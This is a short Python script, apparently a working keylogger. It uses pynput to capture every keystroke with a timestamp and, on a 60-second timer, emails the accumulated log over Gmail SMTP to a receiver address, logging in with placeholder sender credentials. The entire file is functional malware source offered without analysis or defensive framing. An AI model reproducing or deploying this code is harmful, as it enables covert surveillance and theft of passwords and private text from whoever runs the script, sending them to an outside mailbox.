from pynput.keyboard import Key, Listener
from threading import Timer
import smtplib
from datetime import datetime

toaddr = "receiver email address"


server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('Sender email address', '16 digit code')

logs = ''


def on_press(key):
    global logs
    k = str(key).replace("'", "")
    if k == 'Key.enter':
        logs += "[ENTER]\n"
    elif k == 'Key.backspace':
        logs = logs[:-1]
    elif k == 'Key.shift':
        logs += ('^' + "\n")
    elif k == 'Key.delete':
        logs += '[DEL]'
    else:
        logs += (str(datetime.now()) + "  " + k + "\n")


def send_logs():
    global logs
    print("Length = ", len(logs))
    if len(logs) > 0:
        server.sendmail("Sender email address", toaddr, logs)
        logs = ''
        print('Mail Sent')
    Timer(60.0, send_logs).start()


listener = Listener(on_press=on_press)
listener.start()

Timer(60.0, send_logs).start()
